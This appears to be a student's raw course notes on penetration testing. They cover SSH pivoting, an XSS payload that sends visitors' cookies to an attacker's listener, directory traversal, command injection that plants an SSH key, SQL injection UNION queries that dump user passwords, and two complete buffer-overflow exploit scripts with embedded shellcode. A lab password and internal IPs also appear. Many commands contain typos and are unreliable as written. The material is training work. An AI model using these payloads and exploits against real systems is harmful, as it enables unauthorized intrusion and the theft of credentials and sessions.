# Security
```
HOUT-005-M 
STACK # 19 
PASS: NGhXitkmKFkviR3
IP: 10.50.37.133
Linux op stations: 192.168.65.20, 10.50.37.248
Windws OP: 192.168.65.10, 10.50.38.70
Practice SQL IP: 10.50.29.140

```
# Control Socket
```
## Set up control Socket 
ssh -MS /tmp/jump student@10.50.37.133

## Ping sweep from jump box 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

## Dynamic port forward
ssh -S /tmp/jump -O forward -D9050

## Nmap found IP's 
proxychaains nmap x.x.x.x

## Interogate found ports 
proxychains nc x.x.x.x ##

## Port forward 
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L3333:192.168.28.100:2222
  - Can contain multiple jumps within socket file 

## Set up next hop 
 ssh -MS /tmp/t1 credentials@127.0.0.1 -p 3333

## Cancel Port Forward 
ssh -S /t,mp/jump jump -O cancel -L1111:192.168.1.100:80
ssh -S /tmo/jump jump -O cancel -D9050

```

# Penetration Testing 


## 6 Phases
```
* Mission definition 
* Recon 
* Footprinting 
* Explotation & Initial Access
* Post-Explotation 
* Document Mission

### Phase 1 Mission definition 
* Define Goals, scope and RoE

### Phase 2 Recon 

### Phase 3 Footprinting 

### Phase 4 Exploitation & Initial Access 

### Phase 5 Post-Exploitation 

### Phase 6 Document Mission 

```

# nmap Scripts

```
/usr/share/nmap/scripts -> Locationof nmap scripts
```
# Web Exploitation 
## Day #1 

```
* Http tools
- tcpdump 
- wireshark 

* Http Methods 
- Get 
- Post 
- Head 
- Put

* Http Response Codes 
- 10X -> Information al 
- 2XX -> Success
- 30X -> Redirection 
- 4XX -> Client Error 
- 5XX -> Server Error 

* Http Fields 
- User-Agent 
- Referer 
- Cookie 
- Date 
- Server
- Set-Cookie 

* ?var=hi -> Sends a GET request for specified variable to web server 
  - ?home=../../../../../etc/passwd

```

# Wget 

```
* Recursively download
* Recover from Broken Transfers 
* SSL/TLS support

Examples: 
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php

```

# cURL 

``` 
* Not Recursive 
* Can use pipes 
* Upload abilty 
* Supports more protocols vs Wget like SCP & POP3

Examples: 
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

``` 

# JavaScript(JS)
```
* Allows websites to interact with the client

* JavaScript runs on the client’s machine

* Coded as .js files, or in-line of HTML

* changeText()

* <script>document.location="http://10.50.X.X:8000/"+document.cookie;</script>
  - python3 -m http.server
    -> Opens a http port for the cookies to be sent to on your machine


```
# Enumeration 
```
* ROBOTS.TXT -> 
* Legitimate Surfing 
* Tools 
- NSE scripts 
- Nikto 
Burp suite (outside class)

```
# Cross-Site Scipting (XSS) Overview 

```
* Insertion o farbitary code into a webpage, that excutes in browser of visitors 
* Unsanitized GET,POST, and PUT methods allow JS to be placed on websites 
* Often found in forums that allow HTML

```

# Reflected XSS 

```
* Most common form of XSS 
* transient, occurs in erro rmessages or serach results 
* Delivered through intermediate media, such as a link in an email 
* Characters that are normally illegal in URLs can be Base64 encded 

```

# Sever-Side injection 

```
Directory Traversal/Path Traversal


Ability to read/execute outside web server’s directory

Uses ../../ (relative paths) in manipulating a server-side file path


```

# Malicious 
ile upload 


# Command Injection 

```
* ';' to run you own set commands 
* can be utilized to enumerate directories and files 
* var/www/html -> apache home directory 
* Can be used to upload public ssh key 
* make directory for ssh on webserver
* regenertae public and private keys 
  - ssh-keygen -t rsa -b 4096 
  - cat ../../.ssh/id_rsa.pub
  - echo "entire rsa key" > /var/www/.ssh/authorized_keys
  - ssh www-data@<ip>




```

# Web Day 2 
## SQL Injections 

```
* SQL 
- Structured Query Language-ANSI 
- Additional Commands added by vendors 
- Select and Union 

```
# SQL POST METHOD 
```
* mysql -> used to drop into sql server 
* show databases ; -> dumps databases to screen 
* use information_schema : -> drops into specified database 
* show columns from columns ; -> displays different fields within the database
  - Table_schem
  - Table_name 
  - Column_name 
* select table_name from information_schema.columns ; - displays table_name columns
* select table_name,column_name from information_schema.columns ; - displays table_name columns
* select table_schema,table_name,column_name from information_schema.columns ; - displays table_name columns
* show tables from sessions ; 
* show columns from session.tires ;
* select tireid,name,size from session.Tires ;
* select tireid,name,size from session.Tires UNHION SELECT name,type,cost from session.car ;
* select tireid,name,size,4 from session.Tires UNHION SELECT name,type,cost,color from session.car ; -> using 4 as a place holder to display new option 
* Audi' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo # 
* Audi' UNION SELECT tireid,2,size,cost,5 FROM session_schema.columns



# SQL Injection on a unsanitized website
* 'Or 1='1 -> veridies i data base i 
* tURN GET rEQUEST INT RAW DATA 
* Audi UNION SELECT 1,2,3,4,5 # 

Steps: 
1) ID Vuln. Field
2) ID # of Columns
3) Dump Database with Golden Statment 


```

# SQL GET METHOD 
```
-> In URL search bar 
* Selection=2 OR 1=1 
  - Test every number until you null out 
* UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
* UNION SELECT session_id,user_id,statusFROM session.session_log # 
* UNION SELECT id,name,@@version FROM session.user 



```
UNION SELECT TABLE_CATALOg,TABLE_SCHEMA,TABLE_NAME FROM information.schema.tables

# Reverse Egineering
```





```

# Post exploitation 
## Common Terms 
```
* Stack -> Contigous section of memory used for passing arguements 
* 
```
## Bufer Overflow Defenses  
```
* Non excutable 
* Addresss Apce Layout Randomization (ASLR) 
* Dat aExcution Prevention (DEP) 
* Stack canaries
* Position Indeendent Excutable (PIE)
```

## Technical Help
```
* IDA, GHIDRA 
* GDB, MONA,IMMUNITY 
* BASH, PYTHON
```
# Linux Explotation Dev. 
```
- Check for arugments -> ./exe <<<$(echo "AAAAAAAAAAAAAAAAA"
- Enter gdb 
- bufer = website bufer //https://wiremask.eu/tools/buffer-overflow-pattern-generator/
- (in gdb) run <<<$(./bufff.py) 
- cp eip hex value, insert into websire, click outside box. umber given is yourexact buffer
- creat nop sled -> nop = "\x90" * 15
- env - gdb "exe name" 
- show env
- unset env LINES
- unset env COLUMNS
- run the program 
- Crash the program first before running info proc map in GDB 
- Run find to find jump esp -> find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after heap line, last hex value in stack line
- copy and paste first 4 addresses after running find command 
- convert from big endian to little endian 
- After converting replace eip with first converted memory location 
- scp exploit file over to machin e
- find eip for that machine 
- find new shell for target machine
- If permissions denied, modify exploit shell to said command trying to run 


- Msfconsole shell code: 
- msfdb init -> initialze database 
- use payload/linux/x86/exec
- show options
- set CMD whoami
- generate -b "\x00" -f python
- copy shell code into script
- add (+buf into print statment) 
```
## Example Scripts
```
#!/usr/bin/env python

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xdb\xc6\xb8\xaa\x49\x42\x92\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x0b\x83\xc3\x04\x31\x43\x15\x03\x43"
buf += b"\x15\x48\xbc\x28\x99\xd4\xa6\xff\xfb\x8c\xf5\x9c"
buf += b"\x8a\xab\x6e\x4c\xfe\x5b\x6f\xfa\x2f\xf9\x06\x94"
buf += b"\xa6\x1e\x8a\x80\xbe\xe0\x2b\x51\xb6\x88\x44\x30"
buf += b"\x55\x21\x9b\xe5\xf6\x38\x7a\xc4\x79"
print (buffer+eip+nop+buf)
# find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after stack line, last hex value in stack line 
# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"
-----------------------------------------------------------------------------------------------------------

#!/usr/bin/env python 

buffer = "A" * 76

eip = "\x59\x3b\xde\xf7"

nop = "\x90" * 15

buf =  b""
buf += b"\xb8\x9d\x92\xd0\xec\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x0b\x31\x46\x14\x83\xc6\x04\x03\x46"
buf += b"\x10\x7f\x67\xba\xe7\x27\x11\x69\x9e\xbf\x0c\xed"
buf += b"\xd7\xd8\x27\xde\x94\x4e\xb8\x48\x74\xec\xd1\xe6"
buf += b"\x03\x13\x73\x1f\x14\xd3\x74\xdf\x6c\xbb\x1b\xbe"
buf += b"\xff\x52\xe4\x17\x53\x2d\x05\x5a\xd3"
print(buffer+eip+nop+buf)
# find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"

#comrade 
#0xf7df1b51 0xf7 df 1b 51 "\x5\x1b\xdf\xf7"
#0xf7f6674b
#0xf7f72753
#0xf7f72c6b
```















